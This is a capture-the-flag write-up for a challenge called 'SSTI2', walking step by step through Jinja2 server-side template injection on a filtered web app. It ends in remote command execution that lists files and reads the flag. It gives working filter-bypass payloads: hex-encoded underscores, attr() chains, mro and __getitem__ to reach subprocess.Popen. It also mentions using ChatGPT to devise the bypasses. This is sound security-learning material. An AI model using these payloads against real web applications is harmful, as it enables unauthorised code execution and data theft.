# SSTI2
## Description: 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website here!

### Solution
1. Using the payload `{{7*'7'}}`, we get `7777777`. Thus, Jinja2 is being used.
2. However, when we run `{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}`, the website return "Stop trying to break me message", indicating filter is being used.
3. To solve this, I refer to the websites https://ctf.zeyu2001.com/2021/csaw-ctf-qualification-round-2021/ninja and https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f to learn about bypassing blacklist filter.
4. First, when I try out `().__class__`, it is getting blocked as the underscore is being blacklisted.
5. Try encode the underscore with '\x5f' by using the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')}}'**. Bypass successful.
6. Next, just search **<class ‘subprocess.Popen’>** in subclasses using **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')}}'**
7. However, nothing is returned. To test that, we will first try **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')}}**
8. Nothing is returned, suggesting `__base__` maybe blocked.
9. Through ChatGPT, it is suggesting us to use **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()}}'** and it works successfully.
10. But, as we try on the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()[-1]}}'**, it generates internal server error. But as we change [-1] to [1], it is blocked due to blacklisting on [].
11. Through ChatGPT, it is suggesting us to use **|last** instead of [-1]. So, the new payload is **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last}}'** and it returns **<class 'object'>**.
12. Next, to get a list of all built-in Python classes, we will access `__subclassess__()` using the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}}'**
13. It will return list of subclasses. We are interested in getting the index of **subprocess.Popen**.
14. To get the index, copy all the return subclasses into a file name subclasses.txt and run this python script on it.

    ```python
    with open('subclasses.txt') as p:
        check = p.read()
    for index, value in enumerate(check.split(',')):
        if "<class 'subprocess.Popen'>" in value:
            print(index)
    ```
15. The index of **subprocess.Popen** is 356.
16. Subprocess is found in index 356, but the problem is we can’t use []. We can replace the array [] by using the __ getitem __ method.
17. So, we will use the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)}}'**.
18. For, RCE try the payload **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)('ls -la',shell=True,stdout=-1)|attr('communicate')()}}'** to list all the files.
19. To read the flag, use **'{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('mro')()|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}'**
